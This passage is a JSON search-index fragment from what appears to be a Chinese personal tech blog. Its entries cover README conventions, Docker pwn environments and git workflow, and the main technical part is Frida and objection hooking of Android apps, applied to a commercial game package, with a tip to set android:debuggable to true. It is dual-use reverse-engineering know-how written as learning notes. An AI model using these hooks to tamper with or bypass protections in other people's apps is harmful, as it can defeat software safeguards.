\"v-0de2da6d#simple-srop\",\"291\":\"v-4e4da9e9\",\"292\":\"v-e1e3da16\",\"293\":\"v-1eb8e595\",\"294\":\"v-10a26406\",\"295\":\"v-8b560ff4\",\"296\":\"v-c5280e6c\",\"297\":\"v-a4d3f0b4\",\"298\":\"v-6366463d\",\"299\":\"v-49ae21d2\",\"300\":\"v-16ab1db4\",\"301\":\"v-4d490a83\",\"302\":\"v-18c37324\",\"303\":\"v-15660bb0\",\"304\":\"v-4b630a84\",\"305\":\"v-76d1c547\",\"306\":\"v-669e794a\",\"307\":\"v-3b62790d\",\"308\":\"v-019bbaf0\"},\"fieldIds\":{\"h\":0,\"t\":1,\"c\":2},\"fieldLength\":{\"0\":[2,30],\"1\":[1,8],\"2\":[1],\"3\":[3,2],\"4\":[4,2],\"5\":[2,2],\"6\":[3,2],\"7\":[3,1],\"8\":[3,1],\"9\":[1,10],\"10\":[2,5],\"11\":[1,4],\"12\":[1],\"13\":[2],\"14\":[1,19],\"15\":[1],\"16\":[1,6],\"17\":[1,45],\"18\":[1,11],\"19\":[1,69],\"20\":[1,54],\"21\":[1,75],\"22\":[1,46],\"23\":[2,49],\"24\":[1,6],\"25\":[1],\"26\":[1,8],\"27\":[2,127],\"28\":[2,10],\"29\":[1,17],\"30\":[1,52],\"31\":[1],\"32\":[1,19],\"33\":[1,4],\"34\":[1,2],\"35\":[2,2],\"36\":[1,38],\"37\":[1,22],\"38\":[1,10],\"39\":[2,34],\"40\":[1,11],\"41\":[1,18],\"42\":[1,12],\"43\":[1,147],\"44\":[1,7],\"45\":[2,5],\"46\":[1,85],\"47\":[1,37],\"48\":[6,26],\"49\":[1,1],\"50\":[2,17],\"51\":[1,6],\"52\":[1],\"53\":[2,7],\"54\":[2,4],\"55\":[1,26],\"56\":[1],\"57\":[1,23],\"58\":[2,32],\"59\":[2,27],\"60\":[2,24],\"61\":[1,9],\"62\":[2,14],\"63\":[1,4],\"64\":[1,34],\"65\":[1,28],\"66\":[1,36],\"67\":[1,15],\"68\":[5],\"69\":[1,29],\"70\":[1,16],\"71\":[1,62],\"72\":[1,39],\"73\":[1,5],\"74\":[1,22],\"75\":[1,40],\"76\":[3],\"77\":[1,53],\"78\":[1,20],\"79\":[1,6],\"80\":[1,20],\"81\":[1,52],\"82\":[1,1],\"83\":[2,2],\"84\":[8,6],\"85\":[1,6],\"86\":[1,9],\"87\":[1,25],\"88\":[1,17],\"89\":[3,5],\"90\":[1,44],\"91\":[1,19],\"92\":[6,34],\"93\":[4,30],\"94\":[3],\"95\":[3,26],\"96\":[1,70],\"97\":[1,72],\"98\":[2,62],\"99\":[1,9],\"100\":[1,40],\"101\":[1,7],\"102\":[3,18],\"103\":[2,20],\"104\":[3,83],\"105\":[1,7],\"106\":[3,137],\"107\":[1,15],\"108\":[1,4],\"109\":[4,397],\"110\":[1,47],\"111\":[1,9],\"112\":[1,16],\"113\":[1,2],\"114\":[1,44],\"115\":[1,35],\"116\":[3,11],\"117\":[2],\"118\":[4,11],\"119\":[1],\"120\":[2,16],\"121\":[1,10],\"122\":[1,5],\"123\":[1,21],\"124\":[2,152],\"125\":[1,3],\"126\":[4,1],\"127\":[2,94],\"128\":[1,7],\"129\":[1,58],\"130\":[5,63],\"131\":[3,19],\"132\":[3,163],\"133\":[1,6],\"134\":[1,53],\"135\":[2,14],\"136\":[2,46],\"137\":[2,115],\"138\":[4,165],\"139\":[2,3],\"140\":[5,8],\"141\":[1,8],\"142\":[1,29],\"143\":[1,117],\"144\":[1,90],\"145\":[1,7],\"146\":[6,13],\"147\":[1,7],\"148\":[1,6],\"149\":[1],\"150\":[2,96],\"151\":[2,22],\"152\":[2,37],\"153\":[1,58],\"154\":[1,152],\"155\":[5],\"156\":[1,22],\"157\":[2,57],\"158\":[2,44],\"159\":[2,15],\"160\":[1,7],\"161\":[1,54],\"162\":[1,31],\"163\":[1,91],\"164\":[1,4],\"165\":[2,95],\"166\":[4],\"167\":[2,19],\"168\":[1,6],\"169\":[3,20],\"170\":[1,7],\"171\":[1,6],\"172\":[4,13],\"173\":[1,30],\"174\":[4,41],\"175\":[4,58],\"176\":[3,27],\"177\":[1,2],\"178\":[4,15],\"179\":[3,20],\"180\":[4,79],\"181\":[1,16],\"182\":[1,110],\"183\":[2,18],\"184\":[1,25],\"185\":[1,21],\"186\":[1,47],\"187\":[1,9],\"188\":[1,73],\"189\":[2,33],\"190\":[1,2],\"191\":[2],\"192\":[1,21],\"193\":[1,106],\"194\":[4],\"195\":[1,60],\"196\":[1,21],\"197\":[1],\"198\":[1,9],\"199\":[1,10],\"200\":[1],\"201\":[1,8],\"202\":[1,89],\"203\":[1],\"204\":[1,17],\"205\":[1,21],\"206\":[1,7],\"207\":[1,8],\"208\":[8,12],\"209\":[1,2],\"210\":[1,4],\"211\":[1,27],\"212\":[3,7],\"213\":[3,51],\"214\":[4,3],\"215\":[1,7],\"216\":[4,27],\"217\":[3,4],\"218\":[1,9],\"219\":[1,10],\"220\":[1,44],\"221\":[2,13],\"222\":[1,21],\"223\":[1,106],\"224\":[4,55],\"225\":[1,7],\"226\":[1,50],\"227\":[1,40],\"228\":[3],\"229\":[1,3],\"230\":[1,15],\"231\":[1,78],\"232\":[1],\"233\":[1],\"234\":[1,109],\"235\":[4,15],\"236\":[2,57],\"237\":[1,20],\"238\":[1,31],\"239\":[1,22],\"240\":[1,10],\"241\":[5,32],\"242\":[1,1],\"243\":[1,58],\"244\":[1,77],\"245\":[1,45],\"246\":[1,76],\"247\":[1,85],\"248\":[3,42],\"249\":[1,140],\"250\":[1,2],\"251\":[2,19],\"252\":[2,15],\"253\":[1,1],\"254\":[4,62],\"255\":[1,76],\"256\":[1,33],\"257\":[1],\"258\":[1,122],\"259\":[1,20],\"260\":[1,137],\"261\":[1,15],\"262\":[3,2],\"263\":[1,2],\"264\":[1,109],\"265\":[1,104],\"266\":[2,89],\"267\":[1,119],\"268\":[2,197],\"269\":[2,140],\"270\":[4,92],\"271\":[4,113],\"272\":[2,8],\"273\":[1,182],\"274\":[3,14],\"275\":[2,28],\"276\":[1,212],\"277\":[8],\"278\":[1,22],\"279\":[2,57],\"280\":[2,44],\"281\":[2,15],\"282\":[1,7],\"283\":[1,54],\"284\":[1,31],\"285\":[1,91],\"286\":[1,4],\"287\":[2,95],\"288\":[7,246],\"289\":[2,125],\"290\":[2,132],\"291\":[1],\"292\":[1],\"293\":[1],\"294\":[1],\"295\":[1],\"296\":[1],\"297\":[1],\"298\":[1],\"299\":[2],\"300\":[3],\"301\":[2],\"302\":[1],\"303\":[2],\"304\":[2],\"305\":[1],\"306\":[1],\"307\":[1],\"308\":[1]},\"averageFieldLength\":[1.744336569579288,38.658100104272464],\"storedFields\":{\"0\":{\"h\":\"Blog Home\",\"t\":[\"This is a blog home page demo.\",\"To use this layout, you should set both layout: BlogHome and home: true in the page front matter.\",\"For related configuration docs, please see blog homepage.\"]},\"1\":{\"h\":\"Readme规范学习\",\"t\":[\"上篇学习了git的规范 然后在创立项目的时候 发现其实readme也比较重要 我在以前都忽略了readme的存在于是系统学习学习参考文章一个开源项目的readme文档应该包含哪些信息才算是一份合格的文档？ - 知乎 (zhihu.com)\"]},\"2\":{\"h\":\"必备的信息\"},\"3\":{\"h\":\"项目背景（Background）\",\"t\":[\"介绍为什么要做这个项目 背景和动机是什么\"]},\"4\":{\"h\":\"安装和使用(Install & Usage)\",\"t\":[\"如何安装\",\"如何使用\"]},\"5\":{\"h\":\"[Badge]\",\"t\":[\"是否有类似项目 可以列出来\"]},\"6\":{\"h\":\"主要项目负责人 (Maintainers)\",\"t\":[\"将其他开发者@出来\"]},\"7\":{\"h\":\"参加贡献的方式(Contributing)\",\"t\":[\"写明如何想要进入我们的项目\"]},\"8\":{\"h\":\"开源协议(License)\",\"t\":[\"也就是你的项目采用的开源协议\"]},\"9\":{\"h\":\"frida的基本使用\",\"t\":[\"参考文章Android之Frida框架完全使用指南_android frida-CSDN博客推荐下载书的网站:无名图书 | 一个好看的电子书网站 (book123.info)\"]},\"10\":{\"h\":\"映射端口:\",\"t\":[\"adb forward tcp:xxxx tcp:xxxx \"]},\"11\":{\"h\":\"pc查询手机的进程\",\"t\":[\"frida-ps -U \"]},\"12\":{\"h\":\"hook相关\"},\"13\":{\"h\":\"hook js脚本\"},\"14\":{\"h\":\"附着脚本\",\"t\":[\"启动并且附带脚本\",\"frida -U -f xxxxxx.apk -l xxx.js --no-pause \",\"这里的--no-pause意思是在程序启动后不要停止程序的进程\",\"这里也可以在启动后再 去hook脚本\",\"frida -U -f xxxxx.apk --no-pause %load xxxx.js \"]},\"15\":{\"h\":\"js代码的书写\"},\"16\":{\"h\":\"使用java的平台\",\"t\":[\"使用java平台—>Java.perform(function () {}); \",\"相当于向java层提供了一个callback函数 以便于交互\"]},\"17\":{\"h\":\"获取指定的java类\",\"t\":[\"Java.use(className) \",\"这里引用一下参考文章的列子\",\"当我们获取到Java类之后，我们直接通过 <wrapper>.<method>.implementations =function() {}的方式来hook wrapper类的method方法，不管是实例方法还是静态方法都可以\",\"function main() { //使用java平台 Java.perform( function() { //获取java类 var student=Java.use(\\\"com.example.hookdemo01.Student\\\"); //hook Add方法(重写Add方法) student.Add.implementation=function(a,b) { //修改参数 a=123; b=456; //调用原来的函数 var res = this.Add(a,b); //输出结果 console.log(a,b,res); return res; } } ); } setImmediate(main) \"]},\"18\":{\"h\":\"调用原本的函数\",\"t\":[\"上面举的列子 中出现了调用原本的函数 所以我们其实可以在callback函数里面用this.FUNCTION_NAME来调用原本的函数\",\"<wrapper>.<method>.implementations =function() { this.<method>(); } \"]},\"19\":{\"h\":\"hook重载函数\",\"t\":[\"这里重载函数是java里面的一个特性 就是同一个函数名字 不同的参数列表 可以构造多个同名字的函数 在调用的时候只需要修改参数就可以实现调用不同的实现由于函数名字是一样的所以我猜测frida就难以仅仅靠一个名字来实现hook了 所以我们需要overload标明参数\",\"类似文章中举列子的一样\",\"要hook的代码\",\"public class Student { static public int Add(int a,int b){ return a+b; } static public String test(){ return \\\"test\\\"; } // 要hook的函数 static public String test(int num){ return \\\"test2--\\\"+num; } static public String test(String str){ return str; } } \",\"js代码\",\"//hook重载方法 function hookTest1() { //获取java类 var student=Java.use(\\\"com.example.hookdemo01.Student\\\"); //hook test student.test.overload('int').implementation=function(a) { //修改参数 a=123; //调用原来的函数 var res = this.test(a); //输出结果 console.log(a,res); return res; } } \",\"获取某个重载函数的全部数量\",\"<class>.<function>.overloads.length; \",\"用提取数组的方式依次hook这些重载函数\",\"//hook所有重载函数 function hookTest2() { //获取java类 var student=Java.use(\\\"com.example.hookdemo01.Student\\\"); //重载方法的个数 var overlength=student.test.overloads.length; //循环hook所有重载方法 for(var i=0;i<overlength;i++) { student.test.overloads[i].implementation=function() { //打印参数个数 console.log(arguments.length); return this.test.apply(this,arguments); } } } \"]},\"20\":{\"h\":\"hook构造方法\",\"t\":[\"这里先解释一下什么是构造方法java中类在定义的时候 程序员可以选择显性地去书写和类同名地一个public方法 也可以不写 java会自动给你补上(粗鄙理解)这个方法有什么用呢 就是在这个类实列化的时候 触发 完成类似于初始化的操作比如现在我有类Student那么我在Student a = new Student();的时候相当于会自动去调用函数:a.Student();由于这个是开发知识就不细讲了()\",\"稍微举列子:\",\"package dick; public class Test { public Test() { System.out.print(\\\"test\\\"); } } public class dick { public static void main (String[] args) { Test a = new Test(); } } // 结果:test \",\"对应js的写法\",\"//hook构造函数 function hookTest3() { //获取java类 var student=Java.use(\\\"com.example.hookdemo01.Test\\\"); student.$init.implementation=function() { //调用原函数 this.$init(name,age); //调用构造函数 //student.$new(\\\"guishou\\\",888); } } \"]},\"21\":{\"h\":\"修改类的字段\",\"t\":[\"这里的字段指的是类中定义的成员属性然后这里修改非静态的字段用到的是java.choose函数 这个函数第一个参数就是我们要遍历的类随后我们放入一个类似于回调函数的对象进去这个对象包含:\",\"onMatch\",\"这个key对应的value是一个callback函数 这里会去找到程序中所有实现了指定类的对象 也就是找到所有类型为这个类的对象\",\"相当于遍历 没找到一个对象就会触发这个callback 所以在callback函数中我们的操作对象是每一个对象\",\"onCompete\",\"这个key对应的value也是一个callback函数 在整个搜索流程完成的时候会调用\",\"import java.lang.System.Logger; public class Student { public String name; public int age; private int number; private static String nickname = \\\"Flags\\\"; public Student (String name,int age){ this.age = age; this.name = name; } public void PrintStudent(){ this.number = 888; Log.d(this.name,\\\"nickName:\\\"+this.nickname+\\\"number:\\\"+this.number); } public static void main(String[] args) { System.out.println(\\\"Hello World\\\"); } } \",\"我们这里选择修改nickname这个属性\",\"//修改类字段 function hookTest4() { //获取java类 var student=Java.use(\\\"com.example.hookdemo01.Student\\\"); //修改静态字段 student.nickname.value=\\\"GuiShouFlags\\\"; console.log(student.nickname.value); //修改非静态字段 Java.choose(\\\"com.example.hookdemo01.Student\\\",{ //每遍历一个对象都会调用onMatch onMatch:function(obj) { //修改每个对象的字段 obj.number.value=999; console.log(obj.number.value); //字段名和函数名相同需要加下划线 //obj._number.value=999; }, //遍历完成后调用onComplete onComplete:function() { } }); } \"]},\"22\":{\"h\":\"枚举所有的类和方法\",\"t\":[\"这里很多前提知识\",\"function hookTest6() { //枚举已经加载的类 异步方式 Java.enumerateLoadedClasses({ //每枚举一个类调用一次 onMatch:function(name,handler) { //对类名进行过滤 if(name.indexOf(\\\"com.example.hookdemo01\\\")!=-1) { //输出类名 console.log(name); //根据类名获取java类 var clz=Java.use(name); //获取类的所有方法 var methods=clz.class.getDeclaredMethods(); //循环输出所有方法 for(var i=0;i<methods.length();i++) { console.log(methods[i]); } } }, //枚举完成以后调用 onComplete:function() { } }); //枚举已经加载的类 同步方式 var classes=Java.enumerateClassLoadersSync(); for(var i=0;i<methods.classes();i++) { if(classes[i].indexOf(\\\"com.example.hookdemo01\\\")!=-1) { console.log(classes[i]); //枚举方法同上... } } } \"]},\"23\":{\"h\":\"hook so中的函数\",\"t\":[\"这里如果这个函数不是导出函数则我们通过偏移来获取这个函数这个步骤 就是算偏移嘛(应该 错了别打我) libcBaseAddr + offset\",\"//hook无导出函数 function hookTest9() { //so名称 var so_name=\\\"libnative-lib.so\\\"; //要Hook的函数偏移 var fun_off=0x7078; //加载到内存后，函数地址=so地址+函数偏移 var so_base_addr=Module.findBaseAddress(so_name); var add_func=parseInt(so_base_addr,16)+fun_off; var ptr_fun=new NativePointer(add_func); Interceptor.attach(ptr_fun,{ //在hook函数之前执行 onEnter:function(args) { console.log(\\\"hook enter\\\"); }, //在hook函数之后执行 onLeave:function(retval) { console.log(\\\"hook leaver\\\"); } }); } \"]},\"24\":{\"h\":\"frida的反调试\",\"t\":[\"这里学习到的 我们调试一个程序的时候 我们首先要获取它的包名提前声明这里实战 只是为了学习 学习经验()\"]},\"25\":{\"h\":\"实战\"},\"26\":{\"h\":\"获取包名\",\"t\":[\"这里看教程大概就是 去找到AndroidMainfest.xml文件 然后搜索package=xxxx这个xxxx就是包的名字 \",\"这里我们拿到包名字:com.netease.x19\"]},\"27\":{\"h\":\"hook 一个测试脚本\",\"t\":[\"function main() { Java.enumerateLoadedClasses({ onMatch: function(name, handler) { if(name.indexOf(\\\"com.netease.x19\\\") != -1) { console.log(name); var clz = Java.use(name); var methods = clz.class.getDeclaredMethods(); for(var i = 0; i < methods.length; i++) { console.log(\\\"name:\\\", name, \\\"methods:\\\", methods[i]); } } }, onComplete: function() { } }); } setImmediate( function(){ console.log(\\\"test\\\") Java.perform(main); } ) \",\"然后\",\"我们执行指令\",\"frida -U -f com.netease.x19 -l hook.js --no-pause \",\"然后发生报错:\",\"usage: frida [options] target frida: error: unrecognized arguments: --no-pause \",\"这里搜了去 发现frida在新版本中移除了--no-pause 所以我们就不带这个了\",\"执行完上面的hook指令后发现了报错\",\"Failed to spawn: need Gadget to attach on jailed Android; its default location is: C:\\\\Users\\\\61428\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\frida\\\\gadget-android-arm64.so \",\"然后搜索发现是我修改了默认的端口号为11451 所以我带上参数:-H 127.0.0.1:11451\",\"frida -H 127.0.0.1:11451 -f com.netease.x19 -l hook.js \",\"执行成功\",\" ____ / _ | Frida 16.1.8 - A world-class dynamic instrumentation toolkit | (_| | > _ | Commands: /_/ |_| help -> Displays the help system . . . . object? -> Display information about 'object' . . . . exit/quit -> Exit . . . . . . . . More info at https://frida.re/docs/home/ . . . . . . . . Connected to 127.0.0.1:11451 (id=socket@127.0.0.1:11451) Spawned `com.netease.x19`. Resuming main thread! [Remote::com.netease.x19 ]-> \",\"然后我们得到了一堆数据 太多了 这里放不下 接下来我们需要筛选(留着后天来写)\"]},\"28\":{\"h\":\"objection 初次体验\",\"t\":[\"学习文章[分享]objection基本操作与实战-Android安全-看雪-安全社区|安全招聘|kanxue.com\",\"objection 使用详解 - ol4three\"]},\"29\":{\"h\":\"链接\",\"t\":[\"我们先通过指令查到我们的包名\",\"adb shell dumpsys window | grep CurrentFocus \",\"这个指令可以查到当前的窗口的包和目前的class\",\"pack_name\",\"执行指令objection -g com.netease.x19 explore\"]},\"30\":{\"h\":\"初步探索\",\"t\":[\"使用指令\",\"android hooking list activities \",\"获取目前加载的class 列表 然后找到我们的com.mojang.minecraftpe 进行hook\",\"hook\",\"android hooking watch class_method com.mojang.minecraftpe.MainActivity --dump-args --dump-backtrace --dump-return \",\"image-20240320105839523\",\"出现了报错\",\"哈哈哈哈 我犯蠢了 应该是class 而不是class_method\",\"android hooking watch class com.mojang.minecraftpe.MainActivity --dump-args --dump-backtrace --dump-return \",\"img\",\"调用了的函数\",\"(agent) [301082] Called com.mojang.minecraftpe.MainActivity.isTextWidgetActive() (agent) [301082] Called com.mojang.minecraftpe.MainActivity.tick() (agent) [301082] Called com.mojang.minecraftpe.MainActivity.getCursorPosition() (agent) [301082] Called com.mojang.minecraftpe.MainActivity.nativeJsCall(java.lang.String, com.mojang.minecraftpe.RNCallPythonRetObj) (agent) [301082] Called com.mojang.minecraftpe.MainActivity.getInstance() (agent) [301082] Called com.mojang.minecraftpe.MainActivity.setRuntimeMsg(java.lang.String) (agent) [301082] Called com.mojang.minecraftpe.MainActivity.nativeSendMessageToJs(java.lang.String) (agent) [301082] Called com.mojang.minecraftpe.MainActivity.doesReactNativeExist() \",\"查看目前top顶部的activity\",\"adb shell dumpsys activity top \"]},\"31\":{\"h\":\"分析\"},\"32\":{\"h\":\"isTextWidgetActive\",\"t\":[\" android hooking watch class_method com.mojang.minecraftpe.MainActivity.isTextWidgetActive --dump-args --dump-backtrace --dump-return \",\"image-20240320113131596\",\"这里看名字就大概知道isTextWidgetActive是检测\",\"然后这个东西被getCursorPosition调用的\"]},\"33\":{\"h\":\"getCursorPosition\",\"t\":[\"image-20240320113426950\",\"返回值-1\"]},\"34\":{\"h\":\"TICK\",\"t\":[\"image-20240320114400575\"]},\"35\":{\"h\":\"Android xml文件分析\",\"t\":[\"主要是说明一些逆向的时候我们需要看的信息 方便我们去分析源码\"]},\"36\":{\"h\":\"学习文章\",\"t\":[\"apk文件大致结构:(https://www.52pojie.cn/thread-1781093-1-1.html)](https://zhuanlan.zhihu.com/p/66800574)\",\"application标签大致说明:android中application标签说明_android application标签引用class内容-CSDN博客\",\"改默认启动activity:在Android Studio中改变默认的启动Activity_android studio在mainactivity之前运行-CSDN博客\",\"详细说明intent-filter :Android中Intent-filter的四个属性Action，Category，Extras，Data - 天涯海角路 - 博客园 (cnblogs.com)\",\"说明intent-filter的action带来的变化:Intent的各种Action - 知乎 (zhihu.com)\"]},\"37\":{\"h\":\"主标签\",\"t\":[\"manifest标签\",\"包含 基本信息 包名、版本号、SDK版本、应用程序的名称和图标\",\"mainifest\",\"application 标签\",\"包含全局属性 :主题 权限等等\",\"列举几个逆向中常用的属性\",\"android:allowClearUserData :是否给用户删除数据的权限\",\"android:debuggable :是否可以使用debug调试 -->一般我们要改成true\",\"包含四大组件的标签 尤其是activity我们一般都是从activity分析起走\",\"application\"]},\"38\":{\"h\":\"默认activity\",\"t\":[\"往往一些实际项目中我们xml文件中有多个activity标签\",\"more_activity\",\"那么问题来了我们的首先启动的activity究竟是什么？ \",\"根据文章在Android Studio中改变默认的启动Activity_android studio在mainactivity之前运行-CSDN博客可以知道可以通过添加<intent-filter>标签来实现设置\"]},\"39\":{\"h\":\"intent-filter标签\",\"t\":[\"参考文章:Android中Intent-filter的四个属性Action，Category，Extras，Data - 天涯海角路 - 博客园 (cnblogs.com)\",\"主要是包含了一些属性 我们就列举一些目前逆向过程中遇见的\",\"action 属性定义了我们的一些系统行为\",\" ACTION_MAIN\",\"定义了Android Application的入口 并且这个属性只能在android应用中有一个\",\"action_main\",\"ACTION_VIEW\",\"会根据不同的参数来打开不同的界面 详细看Intent的各种Action - 知乎 (zhihu.com)\",\"intent_filter_view\",\"Category属性 定义了一些activity的执行方式\",\"CATEGORY_LAUNCHER主要和action中的android.intent.action.MAIN搭配 来确定默认首先进入的activity\"]},\"40\":{\"h\":\"默认activity标志\",\"t\":[\"通过上面信息 我们可以知道 我们有两个特征值 \",\"intent-filter中action\",\"intent-filter中category\",\"main_activity_filter\",\"我们成功筛选出我们的主activity 然后分析即可\"]},\"41\":{\"h\":\"构建指定版本libc的docker\",\"t\":[\"因为在阅读文章的时候 复现它的操作发现它的libc版本太低了 导致我们的复现失败 所以这里学习docker构造指定版本的libc环境参考文章:Docker配置任意版本编译环境（GCC升级、降级、指定版本）_如何降低docker里面的gcc版本-CSDN博客使用docker调试和部署pwn题-Pwn-看雪-安全社区|安全招聘|kanxue.comdocker run 命令详解（新手入门必备）-CSDN博客\"]},\"42\":{\"h\":\"版本对应\",\"t\":[\"Ubuntu20.04：libc-2.31 Ubuntu18.04：linc-2.27 Ubuntu16.04：libc-2.23 Ubuntu14.04：libc-2.19docke\"]},\"43\":{\"h\":\"操作指令\",\"t\":[\"这里只是浅浅展示一下基础会用到的指令 然后将遇到的报错展示出来 以及对应的解决方法 \",\"install cmd:\",\"docker pull ubuntu:xx.xx \",\"然后因为我下载了docker destop导致报错:\",\"error during connect: this error may indicate that the docker daemon is not running: Get \\\"http://%2F%2F.%2Fpipe%2Fdocker_engine/v1.24/images/json\\\": open //./pipe/docker_engine: The system cannot find the file specified. \",\"找到解决文章:docker 桌面版报错error during connect: This error may indicate that the docker daemon is not running.:-CSDN博客\",\"结果没办法解决 继续报错:\",\"switching to windows engine: request failed and retry attempts exhausted: Post \\\"http://ipc/engine/switch\\\": open \\\\\\\\.\\\\pipe\\\\dockerBackendApiServer: The system cannot find the file specified. \",\"然后开启destop后 自动就好了 怪\",\"查看镜像\",\"docker images \",\"结果:\",\"REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu 22.04 3db8720ecbf5 2 weeks ago 77.9MB ubuntu 18.04 f9a80a55f492 9 months ago 63.2MB ubuntu 16.04 b6f507652425 2 years ago 135MB \",\"运行images\",\"docker run -d -p 宿主机端口:容器端口 --name 容器名称 镜像的标识:镜像名称[:tag] // 我们使用 可以直接进入docker内部 docker run -id --name=\\\"pwn\\\" b6f507652425 /bin/sh // -i 即使未链接stdin(标准输入)也保持打开状态 并且分配一个交互终端 // -t 容器启动后直接进入命令行 // -d 后台运行 // 所以我在这里选择的是 -id \",\"查看正在执行的容器\",\"docker ps -a \",\"结果\",\"CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES af2e5d02e3e8 b6f507652425 \\\"/bin/bash\\\" 3 seconds ago Exited (0) 3 seconds ago pwn_docker 6711535f8c6a 3db8720ecbf5 \\\"/bin/bash\\\" 4 minutes ago Exited (0) 4 minutes ago confident_pike \",\"进入docker\",\"docker exec -it container_id /bin/sh \",\"向docker内部传文件\",\"docker cp 本地地址 container_id:docker内路径 \",\"也可以docker 内部传给本地\",\"docker cp container_di:docker内路径 本地地址 \"]},\"44\":{\"h\":\"主力pwn环境\",\"t\":[\"由于我的vmware中ubuntu再次崩溃了 然后忘记存快照了 所以转使用docker\",\"文章中推荐的主力pwn环境是:\",\"skysider/pwndocker \"]},\"45\":{\"h\":\"pull image\",\"t\":[\"docker pull skysider/pwndocker \"]},\"46\":{\"h\":\"error\",\"t\":[\"进入后使用apt发生报错\",\"Err:1 http://mirrors.aliyun.com/ubuntu bionic InRelease 400 Bad Request [IP: 120.226.194.113 80] Err:2 http://mirrors.aliyun.com/ubuntu bionic-security InRelease 400 Bad Request [IP: 120.226.194.113 80] Err:3 http://mirrors.aliyun.com/ubuntu bionic-updates InRelease 400 Bad Request [IP: 120.226.194.113 80] Err:4 http://mirrors.aliyun.com/ubuntu bionic-proposed InRelease 400 Bad Request [IP: 120.226.194.113 80] Err:5 http://mirrors.aliyun.com/ubuntu bionic-backports InRelease 400 Bad Request [IP: 120.226.194.113 80] \",\"我以为是docker无法链接外部网络的问题 但是ping baidu.com又是可以的 找了很多文章都没有解决 结果加速器一关久解决好了\",\"大概是docker代理的问题 hhh后面找到个类似的解决的文章:Windows docker镜像 apt update时提示400 Bad Request_docker 400 bad request-CSDN博客\",\"--- baidu.com ping statistics --- 15 packets transmitted, 14 received, 6.66667% packet loss, time 17696ms rtt min/avg/max/mdev = 37.782/38.619/41.413/0.892 ms root@936a687b2420:/ctf# ping http://222.187.238.94:9527/ ping: http://222.187.238.94:9527/: Name or service not known root@936a687b2420:/ctf# ping 222.187.238.94:9527 ping: 222.187.238.94:9527: Name or service not known \"]},\"47\":{\"h\":\"各版本的轻量级pwn环境\",\"t\":[\"有大佬已经写好了:roderickchan/debug_pwn_env Tags | Docker Hub我们只需要根据ubuntu的版本 找到我们需要的libc版本进行下载即可\",\"然后就是我没找到ubuntu16.04版本的也就是libc版本为2.23的 因为这个版本之下没有tcache作为一些原理 所以我选择自己拿ubuntu16.04进行搭建轻量级环境\",\"下载python\",\"直接apt install 是3.5版本 连pip都下载不起 所以参考文章:Ubuntu16.04安装Python3.8，3.7，3.9(含卸载方法，支持多版本共存)-CSDN博客\",\"然后根据docker从0搭建ubuntu16.04pwn环境_pwn docker ubuntu16-CSDN博客进行搭建pwn环境即可\"]},\"48\":{\"h\":\"git提交规范 与 项目提交规范学习(浅学习1.0)\",\"t\":[\"因为我使用git比较随性 所以在这里系统学习一下git的代码提交规范 参考文章:[Git代码提交规范-阿里云开发者社区 (aliyun.com)](https://developer.aliyun.com/article/1290068#:~:text=简介： 关于git的规范 良好的代码提交规范可以帮助团队成员更好地理解和维护代码库。 以下是一些常见的Git代码提交规范：,提交频率：尽量保持提交频率较小，每个提交应该只包含一个逻辑上的更改或修复。 提交信息格式：每个提交应该包含一个简明扼要的提交信息，格式为： [类型]%3A 描述。) 结合cubefs社区的提交规范进行的总结\"]},\"49\":{\"h\":\"提交信息格式\",\"t\":[\"commit应该包含一个简明扼要的提交信息\"]},\"50\":{\"h\":\"格式:\",\"t\":[\"[类型]:描述 \",\"列如:feat: 添加用户注册功能\",\"类型 \",\"feat 新增特性/功能\",\"fix修复bug\",\"docs 文档的变更\",\"style 代码风格的调整\",\"refactor 重构代码\",\"test增加或修改测试用例\",\"chore构建过程或者辅助工具的变更\"]},\"51\":{\"h\":\"commit的内容\",\"t\":[\"如果有关联的issue就把issue的编号写出来\",\"fix: 修复登录页面显示问题 #123 \",\"描述清楚修改的内容\",\"顺便可以提供上下文信息\"]},\"52\":{\"h\":\"分支管理\"},\"53\":{\"h\":\"主分支:\",\"t\":[\"一般是master/main用于部署稳定的版本\",\"develop分支一半用于功能开发或者集成测试\",\"bugfix一般用于解决问题 和 修复bug\",\"feature分支用于创建新功能时的测试分支\"]},\"54\":{\"h\":\"Code Review\",\"t\":[\"我这里的理解是如提交pr的时候先挂着 然后等待一堆人讨论后再合并\",\"良好的审查机制\",\"共同讨论\"]},\"55\":{\"h\":\"提交pr的规范\",\"t\":[\"一般是填写一个表格\",\"// 说明你的pr的作用 / 我们为什么需要它 What this PR does / why we need it: // 此pr修复了什么 Which issue this PR fixes: // 修复问题的编号 fixes # // 给你的批阅者的特别注意事项 Special notes for your reviewer: // 发布说明 Release note: \"]},\"56\":{\"h\":\"记一次删除commit操作\"},\"57\":{\"h\":\"目的\",\"t\":[\"项目上传一个commit 但是这个commit带了bug 为了安全的 优雅的去除这个bug 而且我觉得自己手动查看上次的commit内容并且删除对应文件有点麻烦 不能以后每次都这样操作 于是学习一下如何用git安全地去除(本来不足以写成一篇博文的 但是我感觉以后我可能忘记 于是还是写上)\",\"学习文章:如何从 Github 中删除提交 - 知乎 (zhihu.com)\",\"【git revert】使用以及理解（详解）_git revert用法-CSDN博客\"]},\"58\":{\"h\":\"使用git revert原因\",\"t\":[\"因为从git中删除一个commit这通常是一个坏主意(文章说的)\",\"\\\"从 Git 的历史记录中删除提交通常是一个坏主意。Git 旨在跟踪文件的每个版本\\\"\",\"以及git revert和git reset的区别\",\"revert是用一个新的commit（逆向commit）中合要去除的commit\",\"也就是说我们的commit链长这个样子\",\"![img](file:///C:\\\\Users\\\\NewOm\\\\Documents\\\\Tencent Files\\\\614286773\\\\nt_qq\\\\nt_data\\\\Pic\\\\2024-03\\\\Ori\\\\403fa820f3bc49c2fdf37a4f0419fac2.png)\",\"reset通常是直接删除\"]},\"59\":{\"h\":\"git revert的类型\",\"t\":[\"一种是直接revert common commit 也就是正常git commit产生的commit 我们直接输入指令\",\"git revert commit_id \",\"还有一种是revert merge commit 也就是通过merge合并分支产生的commit\",\"git revert -m num commit_id \",\"这里的num 也就是我们要选择的主线\",\"num我们可以通过git show commit_id来查看\",\"git show bd86846 commit bd868465569400a6b9408050643e5949e8f2b8f5 Merge: ba25a9d 1c7036f \",\"这里num为1就是让ba25a9d 为主线 2则是1c7036f\"]},\"60\":{\"h\":\"使用git revert的注意事项\",\"t\":[\"这里最好直接去看原文 